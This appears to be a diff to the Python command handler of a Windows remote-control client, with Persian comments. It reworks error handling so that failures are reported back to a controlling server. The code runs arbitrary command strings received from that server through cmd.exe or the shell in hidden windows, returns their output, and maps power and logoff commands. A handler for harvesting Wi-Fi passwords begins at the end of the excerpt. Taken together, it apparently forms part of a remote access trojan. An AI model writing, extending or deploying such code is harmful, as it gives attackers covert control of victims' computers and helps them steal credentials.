@@ -102,7 +102,15 @@ class CommandHandler:
         if not handler:
             if Config.DEBUG_MODE:
                 logging.error(f"Unknown command type: {command_type}")
-            raise CommandError(f"Unknown command type: {command_type}")
+
+            # گزارش خطای دستور ناشناخته به سرور
+            error_result = {
+                "status": "error",
+                "message": f"Unknown command type: {command_type}",
+                "command_type": command_type,
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+            return error_result
 
         try:
             # برای دستورات system_command، original_command را از params استخراج کن
@@ -127,7 +135,16 @@ class CommandHandler:
 
         except Exception as e:
             logging.error(f"Command execution failed for {command_type}: {str(e)}")
-            raise CommandError(f"Command execution failed: {str(e)}")
+
+            # گزارش خطای جزئیات به سرور
+            error_result = {
+                "status": "error",
+                "message": f"Command execution failed: {str(e)}",
+                "command_type": command_type,
+                "timestamp": datetime.datetime.now().isoformat(),
+                "error_details": str(e)
+            }
+            return error_result
 
     # ==================== HANDLERS FOR NEW COMMANDS ====================
 
@@ -400,131 +417,173 @@ class CommandHandler:
 
     @staticmethod
     def handle_system_command(params):
-        """Execute system command"""
-        # تبدیل params به دیکشنری اگر لیست است یا None است
-        if params is None:
-            params = {}
-        elif isinstance(params, list):
-            if params and isinstance(params[0], dict):
-                params = params[0]
-            else:
-                params = {}
-        
-        if not isinstance(params, dict):
-            params = {}
-        
-        # استخراج command از پارامترهای مختلف
-        command = (params.get('command') or 
-                   params.get('original_command') or 
-                   params.get('cmd') or 
-                   params.get('type'))
-        
-        if not command:
-            if Config.DEBUG_MODE:
-                logging.error(f"No command found in params: {params}")
-            raise CommandError("No command provided")
-        
-        # حذف اسلش از ابتدای دستور اگر وجود دارد
-        if command.startswith('/'):
-            command = command[1:]
-        
-        COMMAND_MAPPING = {
-            'shutdown': 'shutdown /s /t 0',
-            'restart': 'shutdown /r /t 0',
-            'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
-            'signout': 'logoff',
-            'lock': 'rundll32.exe user32.dll,LockWorkStation',
-            'hibernate': 'shutdown /h',
-            'standby': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
-            'reboot': 'shutdown /r /t 0',
-            'poweroff': 'shutdown /s /t 0',
-        }
-    
-        
-        sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout', 'hibernate', 'standby', 'reboot', 'poweroff']
-        
-        # بررسی دسترسی Administrator برای دستورات حساس
-        if command.lower() in sensitive_commands:
-            try:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
-                if not is_admin:
-                    if Config.DEBUG_MODE:
-                        logging.error(f"Command '{command}' requires admin privileges")
-                    raise CommandError(f"Command '{command}' requires admin privileges")
-            except Exception as e:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Failed to check admin privileges: {str(e)}")
-                raise CommandError(f"Failed to check admin privileges for command '{command}'")
-        
-        # نگاشت دستور به دستور واقعی
-        actual_command = COMMAND_MAPPING.get(command.lower(), command)
-        if Config.DEBUG_MODE:
-            logging.info(f"Mapped command: {command} -> {actual_command}")
-        
+        """Execute system command with proper error handling"""
         try:
-            if Config.DEBUG_MODE:
-                logging.info(f"Executing system command: {actual_command}")
+            # تبدیل params به دیکشنری اگر لیست است یا None است
+            if params is None:
+                params = {}
+            elif isinstance(params, list):
+                if params and isinstance(params[0], dict):
+                    params = params[0]
+                else:
+                    params = {}
             
-            # استفاده از shell=True برای دستورات خاص که نیاز به محیط shell دارند
-            shell_needed = any(cmd in actual_command.lower() for cmd in ['shutdown', 'logoff', 'rundll32', 'powercfg'])
+            if not isinstance(params, dict):
+                params = {}
             
-            if shell_needed:
-                result = subprocess.run(
-                    actual_command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=300,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-            else:
-                shell_cmd = ['cmd.exe', '/c', actual_command]
-                result = subprocess.run(
-                    shell_cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=300,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
+            # استخراج command از پارامترهای مختلف
+            command = (params.get('command') or 
+                       params.get('original_command') or 
+                       params.get('cmd') or 
+                       params.get('type'))
             
-            output = {
-                'stdout': result.stdout,
-                'stderr': result.stderr,
-                'returncode': result.returncode,
-                'command': actual_command,
-                'original_command': command,
-                'timestamp': datetime.datetime.now().isoformat(),
-                'success': result.returncode == 0
+            if not command:
+                error_msg = "No command provided"
+                logging.error(error_msg)
+                return {
+                    "status": "error",
+                    "message": error_msg,
+                    "command": "unknown",
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
+            
+            # حذف اسلش از ابتدای دستور اگر وجود دارد
+            if command.startswith('/'):
+                command = command[1:]
+            
+            COMMAND_MAPPING = {
+                'shutdown': 'shutdown /s /t 0',
+                'restart': 'shutdown /r /t 0',
+                'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
+                'signout': 'logoff',
+                'lock': 'rundll32.exe user32.dll,LockWorkStation',
+                'hibernate': 'shutdown /h',
+                'standby': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
+                'reboot': 'shutdown /r /t 0',
+                'poweroff': 'shutdown /s /t 0',
             }
-            
-            if Config.DEBUG_MODE:
-                logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
-            
-            return output
-            
-        except subprocess.TimeoutExpired:
-            error_msg = f"Command timed out: {actual_command}"
-            if Config.DEBUG_MODE:
-                logging.error(error_msg)
-            raise CommandError(error_msg)
         
-        except FileNotFoundError:
-            error_msg = f"Command not found: {actual_command}"
+            sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout', 'hibernate', 'standby', 'reboot', 'poweroff']
+            
+            # بررسی دسترسی Administrator برای دستورات حساس
+            if command.lower() in sensitive_commands:
+                try:
+                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+                    if not is_admin:
+                        error_msg = f"Command '{command}' requires admin privileges"
+                        logging.error(error_msg)
+                        return {
+                            "status": "error",
+                            "message": error_msg,
+                            "command": command,
+                            "requires_admin": True,
+                            "timestamp": datetime.datetime.now().isoformat()
+                        }
+                except Exception as e:
+                    error_msg = f"Failed to check admin privileges: {str(e)}"
+                    logging.error(error_msg)
+                    return {
+                        "status": "error", 
+                        "message": error_msg,
+                        "command": command,
+                        "timestamp": datetime.datetime.now().isoformat()
+                    }
+            
+            # نگاشت دستور به دستور واقعی
+            actual_command = COMMAND_MAPPING.get(command.lower(), command)
             if Config.DEBUG_MODE:
+                logging.info(f"Mapped command: {command} -> {actual_command}")
+            
+            try:
+                if Config.DEBUG_MODE:
+                    logging.info(f"Executing system command: {actual_command}")
+                
+                # استفاده از shell=True برای دستورات خاص که نیاز به محیط shell دارند
+                shell_needed = any(cmd in actual_command.lower() for cmd in ['shutdown', 'logoff', 'rundll32', 'powercfg'])
+                
+                if shell_needed:
+                    result = subprocess.run(
+                        actual_command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=300,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                else:
+                    shell_cmd = ['cmd.exe', '/c', actual_command]
+                    result = subprocess.run(
+                        shell_cmd,
+                        capture_output=True,
+                        text=True,
+                        timeout=300,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                
+                output = {
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'returncode': result.returncode,
+                    'command': actual_command,
+                    'original_command': command,
+                    'timestamp': datetime.datetime.now().isoformat(),
+                    'success': result.returncode == 0,
+                    'status': 'success' if result.returncode == 0 else 'error'
+                }
+                
+                if Config.DEBUG_MODE:
+                    logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
+                
+                return output
+                
+            except subprocess.TimeoutExpired:
+                error_msg = f"Command timed out: {actual_command}"
                 logging.error(error_msg)
-            raise CommandError(error_msg)
-        
-        except PermissionError:
-            error_msg = f"Permission denied for command: {actual_command}"
-            if Config.DEBUG_MODE:
+                return {
+                    "status": "error",
+                    "message": error_msg,
+                    "command": actual_command,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
+            
+            except FileNotFoundError:
+                error_msg = f"Command not found: {actual_command}"
                 logging.error(error_msg)
-            raise CommandError(error_msg)
+                return {
+                    "status": "error",
+                    "message": error_msg, 
+                    "command": actual_command,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
+            
+            except PermissionError:
+                error_msg = f"Permission denied for command: {actual_command}"
+                logging.error(error_msg)
+                return {
+                    "status": "error",
+                    "message": error_msg,
+                    "command": actual_command,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
+            
+            except Exception as e:
+                error_msg = f"Failed to execute command '{actual_command}': {str(e)}"
+                logging.error(error_msg)
+                return {
+                    "status": "error",
+                    "message": error_msg,
+                    "command": actual_command,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
         
         except Exception as e:
-            error_msg = f"Failed to execute command '{actual_command}': {str(e)}"
-            if Config.DEBUG_MODE:
-                logging.error(error_msg)
-            raise CommandError(error_msg)
+            error_msg = f"Unexpected error in system command handler: {str(e)}"
+            logging.error(error_msg)
+            return {
+                "status": "error",
+                "message": error_msg,
+                "timestamp": datetime.datetime.now().isoformat()
+            }
     
     @staticmethod
     def handle_wifi_passwords(params: dict) -> dict:
